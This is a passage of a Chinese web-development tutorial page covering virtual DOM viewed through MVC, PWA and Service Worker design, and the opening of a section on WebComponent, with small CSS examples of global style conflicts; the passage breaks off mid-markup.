url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABKElEQVQoz2VRy06FMBDly03c3+XdufQTTDQxxrgwuQvd6A1bH4kKFChtp7SlLxyKGsCTdvqY95lsTIgJIcF7bxOmi3Mo//7HNTLcwzAopYwxWikAiatpJ0gJggsppdYabTjnGHHrbANmXoVEU6Mk2PGLBbyEpJ6KcW7lrN8O5PKE3e+h+ZC0uHiG3a1+fO1L2jNQJWlIXfc1IUUJ1UtPi6puKwolBUyZDWXeHc7Yw3m0aoz++tjt70ReBKaiHqxW/WCdZTRaFKRrCZJAwdRcuTCX7TxnNNGGDRg856qwVUopUjU/Q4hh3V4Wp3c4vovTK9jdiFb6ZDexgCwKIULYUhJ/w2fzwXR8+nR54Y37UcWFQ9zwuWR7CRwmjgTHgxLTdl3HEwDgv/M3h5wHJLDlsssAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 13 09 34 07"\n        title=""\n        src="/static/2021-07-13-09-34-07-84ff3dbb02e1fa28f5af094d47ff1f46-fee1c.png"\n        srcset="/static/2021-07-13-09-34-07-84ff3dbb02e1fa28f5af094d47ff1f46-a67b7.png 200w,\n/static/2021-07-13-09-34-07-84ff3dbb02e1fa28f5af094d47ff1f46-0b187.png 400w,\n/static/2021-07-13-09-34-07-84ff3dbb02e1fa28f5af094d47ff1f46-fee1c.png 800w,\n/static/2021-07-13-09-34-07-84ff3dbb02e1fa28f5af094d47ff1f46-b1a91.png 1200w,\n/static/2021-07-13-09-34-07-84ff3dbb02e1fa28f5af094d47ff1f46-71011.png 1506w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>在该图中，我们可以把虚拟 DOM 看成是 MVC 的视图部分，其控制器和模型都是由 Redux 提供的。其具体实现过程如下：</p>\n<ul>\n<li>图中的控制器是用来监控 DOM 的变化，一旦 DOM 发生变化，控制器便会通知模型，让其更新数据；</li>\n<li>模型数据更新好之后，控制器会通知视图，告诉它模型的数据发生了变化；</li>\n<li>视图接收到更新消息之后，会根据模型所提供的数据来生成新的虚拟 DOM；</li>\n<li>新的虚拟 DOM 生成好之后，就需要与之前的虚拟 DOM 进行比较，找出变化的节点；</li>\n<li>比较出变化的节点之后，React 将变化的虚拟节点应用到 DOM 上，这样就会触发 DOM 节点的更新；</li>\n<li>DOM 节点的变化又会触发后续一系列渲染流水线的变化，从而实现页面的更新</li>\n</ul>\n<p>在实际工程项目中，你需要学会分析出这各个模块，并梳理出它们之间的通信关系，这样对于任何框架你都能轻松上手了。</p>\n<h2 id="总结-5"><a href="#%E6%80%BB%E7%BB%93-5" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>首先我们分析了直接操作 DOM 会触发渲染流水线的一系列反应，如果对 DOM 操作不当的话甚至还会触发强制同步布局和布局抖动的问题，这也是我们在操作 DOM 时需要非常小心谨慎的原因。</p>\n<p>在此分析的基础上，我们介绍了虚拟 DOM 是怎么解决直接操作 DOM 所带来的问题以及 React Fiber 更新机制。</p>\n<p>要聊前端框架，就绕不开设计模式，所以接下来我们又从双缓存和 MVC 角度分析了虚拟 DOM。双缓存是一种经典的思路，应用在很多场合，能解决页面无效刷新和闪屏的问题，虚拟 DOM 就是双缓存思想的一种体现。而基于 MVC 的设计思想也广泛地渗透到各种场合，并且基于 MVC 又衍生出了很多其他模式（如 MVP、MVVM 等），不过万变不离其宗，它们的基础骨架都是基于 MVC 而来。站在 MVC 视角来理解虚拟 DOM 能让你看到更为“广阔的世界”。</p>\n<h1 id="pwa：解决了-web-应用哪些问题"><a href="#pwa%EF%BC%9A%E8%A7%A3%E5%86%B3%E4%BA%86-web-%E5%BA%94%E7%94%A8%E5%93%AA%E4%BA%9B%E9%97%AE%E9%A2%98" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>PWA：解决了 web 应用哪些问题</h1>\n<p>PWA，全称是 Progressive Web App，翻译过来就是渐进式网页应用。根据字面意思，它就是“渐进式 +Web 应用”。对于 Web 应用很好理解了，就是目前我们普通的 Web 页面，所以 PWA 所支持的首先是一个 Web 页面。至于“渐进式”，就需要从下面两个方面来理解。</p>\n<ul>\n<li>站在 Web 应用开发者来说，PWA 提供了一个渐进式的过渡方案，让普通站点逐步过渡到 Web 应用。采取渐进式可以降低站点改造的代价，使得站点逐步支持各项新技术，而不是一步到位。</li>\n<li>站在技术角度来说，PWA 技术也是一个渐进式的演化过程，在技术层面会一点点演进，比如逐渐提供更好的设备特性支持，不断优化更加流畅的动画效果，不断让页面的加载速度变得更快，不断实现本地应用的特性。</li>\n</ul>\n<p>从这两点可以看出来，PWA 采取的是非常一个缓和的渐进式策略，不再像以前那样激进，动不动就是取代本地 App、取代小程序。与之相反，而是要充分发挥 Web 的优势，渐进式地缩短和本地应用或者小程序的距离。</p>\n<p>那么 Web 最大的优势是什么呢？我认为是自由开放，也正是因为自由和开放，所以大家就很容易对同一件事情达成共识，达成共识之后，一套代码就可以运行在各种设备之上了，这就是跨平台，这也恰恰是本地应用所不具备的。而对于小程序，倒是可以实现跨平台，但要让各家达成共识，目前来看，似乎还是非常不切实际的。</p>\n<p>所以我给 PWA 的定义就是：它是一套理念，渐进式增强 Web 的优势，并通过技术手段渐进式缩短和本地应用或者小程序的距离。基于这套理念之下的技术都可以归类到 PWA。</p>\n<p>那今天我们就主要来聊聊 PWA 主要采用了哪些技术手段来缩短它和本地应用或者小程序的距离。</p>\n<h2 id="web-应用-vs-本地应用"><a href="#web-%E5%BA%94%E7%94%A8-vs-%E6%9C%AC%E5%9C%B0%E5%BA%94%E7%94%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Web 应用 VS 本地应用</h2>\n<p>那相对于本地应用，Web 页面到底缺少了什么？</p>\n<ul>\n<li>首先，Web 应用缺少离线使用能力，在离线或者在弱网环境下基本上是无法使用的。而用户需要的是沉浸式的体验，在离线或者弱网环境下能够流畅地使用是用户对一个应用的基本要求。</li>\n<li>其次，Web 应用还缺少了消息推送的能力，因为作为一个 App 厂商，需要有将消息送达到应用的能力。</li>\n<li>最后，Web 应用缺少一级入口，也就是将 Web 应用安装到桌面，在需要的时候直接从桌面打开 Web 应用，而不是每次都需要通过浏览器来打开。</li>\n</ul>\n<p>针对以上 Web 缺陷，PWA 提出了两种解决方案：通过引入 Service Worker 来试着解决离线存储和消息推送的问题，通过引入 manifest.json 来解决一级入口的问题。下面我们就来详细分析下 Service Worker 是如何工作的。</p>\n<h2 id="什么是-service-worker"><a href="#%E4%BB%80%E4%B9%88%E6%98%AF-service-worker" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>什么是 Service Worker</h2>\n<p>我们先来看看 Service Worker 是怎么解决离线存储和消息推送的问题。</p>\n<p>其实在 Service Worker 之前，WHATWG 小组就推出过用 App Cache 标准来缓存页面，不过在使用过程中 App Cache 所暴露的问题比较多，遭到多方吐槽，所以这个标准最终也只能被废弃了，可见一个成功的标准是需要经历实践考量的。</p>\n<p>所以在 2014 年的时候，标准委员会就提出了 Service Worker 的概念，它的主要思想是在页面和网络之间增加一个拦截器，用来缓存和拦截请求。整体结构如下图所示：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-13-11-14-17-3ba65eaf5c941f0854e96faf4d728664-0ac43.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 54.418604651162795%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABLElEQVQoz5VSO0/DMBDOX2RDrGXgsbKysDIjwUArkQF+AhsSEoJKFQKhTqAuSUrTJsSpE7/P4ZJAU0oVxCfr9Nl3n30PO2CLfy1bNHCKdli7wkn/1u+dgFKNGM/tF1aVtvKVxBi048vz4e4m5HkjNlBoXLYkCwBn8c21nARlAGfAOVoyDWejNyllKa6fOrtjnYvJtjvt3edWC84YHgfu6Utn4/XowGplpaiz0ADVG9CIuw9sx/X33LHbz5TIM0rR+X7VHe5vjY4PrdZS6+8qyrb90TAM0CwnzwORxLil8zmlVAruJebJV7q6wPkRv+gQFmkMSdPMQJKmuuqtMSAF8z7Mo7dGvA5Y29KNaKNoFkeRFKI17V9ohtf+SYQQSYL5poQQJGEYBkFQj2cZn2b1eJdya/rrAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 13 11 14 17"\n        title=""\n        src="/static/2021-07-13-11-14-17-3ba65eaf5c941f0854e96faf4d728664-fee1c.png"\n        srcset="/static/2021-07-13-11-14-17-3ba65eaf5c941f0854e96faf4d728664-a67b7.png 200w,\n/static/2021-07-13-11-14-17-3ba65eaf5c941f0854e96faf4d728664-0b187.png 400w,\n/static/2021-07-13-11-14-17-3ba65eaf5c941f0854e96faf4d728664-fee1c.png 800w,\n/static/2021-07-13-11-14-17-3ba65eaf5c941f0854e96faf4d728664-b1a91.png 1200w,\n/static/2021-07-13-11-14-17-3ba65eaf5c941f0854e96faf4d728664-0ac43.png 1290w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>在没有安装 Service Worker 之前，WebApp 都是直接通过网络模块来请求资源的。安装了 Service Worker 模块之后，WebApp 请求资源时，会先通过 Service Worker，让它判断是返回 Service Worker 缓存的资源还是重新去网络请求资源。一切的控制权都交由 Service Worker 来处理。</p>\n<h2 id="service-worker-的设计思路"><a href="#service-worker-%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Service Worker 的设计思路</h2>\n<p>现在我们知道 Service Worker 的主要功能就是拦截请求和缓存资源，接下来我们就从 Web 应用的需求角度来看看 Service Worker 的设计思路。</p>\n<h3 id="架构"><a href="#%E6%9E%B6%E6%9E%84" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>架构</h3>\n<p>通过前面页面循环系统的分析，我们已经知道了 JavaScript 和页面渲染流水线的任务都是在页面主线程上执行的，如果一段 JavaScript 执行时间过久，那么就会阻塞主线程，使得渲染一帧的时间变长，从而让用户产生卡顿的感觉，这对用户来说体验是非常不好的。</p>\n<p>为了避免 JavaScript 过多占用页面主线程时长的情况，浏览器实现了 Web Worker 的功能。Web Worker 的目的是让 JavaScript 能够运行在页面主线程之外，不过由于 Web Worker 中是没有当前页面的 DOM 环境的，所以在 Web Worker 中只能执行一些和 DOM 无关的 JavaScript 脚本，并通过 postMessage 方法将执行的结果返回给主线程。所以说在 Chrome 中， Web Worker 其实就是在渲染进程中开启的一个新线程，它的生命周期是和页面关联的。</p>\n<p>“让其运行在主线程之外”就是 Service Worker 来自 Web Worker 的一个核心思想。不过 Web Worker 是临时的，每次 JavaScript 脚本执行完成之后都会退出，执行结果也不能保存下来，如果下次还有同样的操作，就还得重新来一遍。所以 Service Worker 需要在 Web Worker 的基础之上加上储存功能。</p>\n<p>另外，由于 Service Worker 还需要会为多个页面提供服务，所以还不能把 Service Worker 和单个页面绑定起来。在目前的 Chrome 架构中，Service Worker 是运行在浏览器进程中的，因为浏览器进程生命周期是最长的，所以在浏览器的生命周期内，能够为所有的页面提供服务。</p>\n<h3 id="消息推送"><a href="#%E6%B6%88%E6%81%AF%E6%8E%A8%E9%80%81" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>消息推送</h3>\n<p>消息推送也是基于 Service Worker 来实现的。因为消息推送时，浏览器页面也许并没有启动，这时就需要 Service Worker 来接收服务器推送的消息，并将消息通过一定方式展示给用户。关于消息推送的细节这里我们就不详述了，如果你感兴趣的话可以自行搜索相关资料去学习。</p>\n<h3 id="安全"><a href="#%E5%AE%89%E5%85%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>安全</h3>\n<p>基于 Web 应用的业务越来越多了，其安全问题是不可忽视的，所以在设计 Service Worker 之初，安全问题就被提上了日程。</p>\n<p>关于安全，其中最为核心的一条就是 HTTP。我们知道，HTTP 采用的是明文传输信息，存在被窃听、被篡改和被劫持的风险，在项目中使用 HTTP 来传输数据无疑是“裸奔”。所以在设计之初，就考虑对 Service Worker 采用 HTTPS 协议，因为采用 HTTPS 的通信数据都是经过加密的，即便拦截了数据，也无法破解数据内容，而且 HTTPS 还有校验机制，通信双方很容易知道数据是否被篡改。关于 HTTPS 协议，我们会在最后的安全模块详细介绍。</p>\n<p>所以要使站点支持 Service Worker，首先必要的一步就是要将站点升级到 HTTPS。</p>\n<p>除了必须要使用 HTTPS，Service Worker 还需要同时支持 Web 页面默认的安全策略、储入同源策略、内容安全策略（CSP）等，关于这些，后续我们也会详细介绍。</p>\n<h2 id="总结-6"><a href="#%E6%80%BB%E7%BB%93-6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>我们先分析了 PWA，它是由很多技术组成的一个理念，其核心思想是渐进式。对于开发者，它提供了非常温和的方式，让开发者将普通的站点逐步过渡到 Web 应用。对于技术本身而言，它是渐进式演进，逐渐将 Web 技术发挥到极致的同时，也逐渐缩小和本地应用的差距。在此基础上，我们又分析了 PWA 中的 Service Worker 的设计思路。</p>\n<p>另外，PWA 还提供了 manifest.json 配置文件，可以让开发者自定义桌面的图标、显示名称、启动方式等信息，还可以设置启动画面、页面主题颜色等信息。关于 manifest.json 的配置还是比较简单的，详细使用教程网上有很多，这里我就不做介绍了。</p>\n<p>添加桌面标、增加离线缓存、增加消息推送等功能是 PWA 走向设备的必备功能，但我认为真正决定 PWA 能否崛起的还是底层技术，比如页面渲染效率、对系统设备的支持程度、WebAssembly 等，而这些技术也在渐进式进化过程中。所以未来如何，我们拭目以待</p>\n<h1 id="webcomponent：像搭积木一样构建-web-应用"><a href="#webcomponent%EF%BC%9A%E5%83%8F%E6%90%AD%E7%A7%AF%E6%9C%A8%E4%B8%80%E6%A0%B7%E6%9E%84%E5%BB%BA-web-%E5%BA%94%E7%94%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>WebComponent：像搭积木一样构建 web 应用</h1>\n<p>什么是组件化呢？</p>\n<p>其实组件化并没有一个明确的定义，不过这里我们可以使用 10 个字来形容什么是组件化，那就是：对内高内聚，对外低耦合。对内各个元素彼此紧密结合、相互依赖，对外和其他组件的联系最少且接口简单。</p>\n<p>可以说，程序员对组件化开发有着天生的需求，因为一个稍微复杂点的项目，就涉及到多人协作开发的问题，每个人负责的组件需要尽可能独立完成自己的功能，其组件的内部状态不能影响到别人的组件，在需要和其他组件交互的地方得提前协商好接口。通过组件化可以降低整个系统的耦合度，同时也降低程序员之间沟通复杂度，让系统变得更加易于维护。</p>\n<p>使用组件化能带来很多优势，所以很多语言天生就对组件化提供了很好的支持，比如 C/C++ 就可以很好地将功能封装成模块，无论是业务逻辑，还是基础功能，抑或是 UI，都能很好地将其组合在一起，实现组件内部的高度内聚、组件之间的低耦合。</p>\n<p>大部分语言都能实现组件化，归根结底在于编程语言特性，大多数语言都有自己的函数级作用域、块级作用域和类，可以将内部的状态数据隐藏在作用域之下或者对象的内部，这样外部就无法访问了，然后通过约定好的接口和外部进行通信。</p>\n<p>JavaScript 虽然有不少缺点，但是作为一门编程语言，它也能很好地实现组件化，毕竟有自己的函数级作用域和块级作用域，所以封装内部状态数据并提供接口给外部都是没有问题的。</p>\n<p>既然 JavaScript 可以很好地实现组件化，那么我们所谈论的 WebComponent 到底又是什么呢？</p>\n<h2 id="阻碍前端组件化的因素"><a href="#%E9%98%BB%E7%A2%8D%E5%89%8D%E7%AB%AF%E7%BB%84%E4%BB%B6%E5%8C%96%E7%9A%84%E5%9B%A0%E7%B4%A0" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>阻碍前端组件化的因素</h2>\n<p>在前端虽然 HTML、CSS 和 JavaScript 是强大的开发语言，但是在大型项目中维护起来会比较困难，如果在页面中嵌入第三方内容时，还需要确保第三方的内容样式不会影响到当前内容，同样也要确保当前的 DOM 不会影响到第三方的内容。</p>\n<p>所以要聊 WebComponent，得先看看 HTML 和 CSS 是如何阻碍前端组件化的，这里我们就通过下面这样一个简单的例子来分析下：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="43090171647509230000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<style>\n  p {\n    background-color: brown;\n    color: cornsilk;\n  }\n</style>\n<p>time.geekbang.org</p>`, `43090171647509230000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                html 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">\n  <span class="token selector">p</span> <span class="token punctuation">{</span>\n    <span class="token property">background-color</span><span class="token punctuation">:</span> brown<span class="token punctuation">;</span>\n    <span class="token property">color</span><span class="token punctuation">:</span> cornsilk<span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>time.geekbang.org<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="90994396982875440000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<style>\n  p {\n    background-color: red;\n    color: blue;\n  }\n</style>\n<p>time.geekbang</p>`, `90994396982875440000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                html 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">\n  <span class="token selector">p</span> <span class="token punctuation">{</span>\n    <span class="token property">background-color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>\n    <span class="token property">color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>time.geekbang<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>上面这两段代码分别实现了自己 p 标签的属性，如果两个人分别负责开发这两段代码的话，那么在测试阶段可能没有什么问题，不过当最终项目整合的时候，其中内部的 CSS 属性会影响到其他外部的 p 标签的，之所以会这样，是因为 CSS 是影响全局的。</p>\n<p>渲染引擎会将所有的 CSS 内容解析为 CSSOM，在生成布局树的时候，会在 CSSOM 中为布局树中的元素查找样式，所以有两个相同标签最终所显示出来的效果是一样的，渲染引擎是不能为它们分别单独设置样式的。</p>\n<p>除了 CSS 的全局属性会阻碍组件化，DOM 也是阻碍组件化的一个因素，因为在页面中只有一个 DOM，任何地方都可以直接读取和修改 DOM。所以使用 JavaScript 来实现组件化是没有问题的，但是 JavaScript 一旦遇上 CSS 和 DOM，那么就相当难办了</p>\n<h2 id="webcomponent-组件化开发"><a href="#webcomponent-%E7%BB%84%E4%BB%B6%E5%8C%96%E5%BC%80%E5%8F%91" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>WebComponent 组件化开发</h2>\n<p>现在我们了解了 CSS 和 DOM 是阻碍组件化的两个因素，那要怎么解决呢？</p>\n<p>WebComponent 给出了解决思路，它提供了对局部视图封装能力，可以让 DOM、CSSOM 和 JavaScript 运行在局部环境中，这样就使得局部的 CSS 和 DOM 不会影响到全局。</p>\n<p>了解了这些，下面我们就结合具体代码来看看 WebComponent 是怎么实现组件化的。</p>\n<p>前面我们说了，WebComponent 是一套技术的组合，具体涉及到了 Custom elements（自定义元素）、Shadow DOM（影子 DOM）和 HTML templates（HTML 模板），详细内容你可以参考 MDN 上的<a href="https://developer.mozilla.org/zh-CN/docs/Web/Web_Components" target="_blank" rel="nofollow noreferrer noopener">相关链接</a>。</p>\n<p>下面我们就来演示下这 3 个技术是怎么实现数据封装的，如下面代码所示：</p>\n<div\n              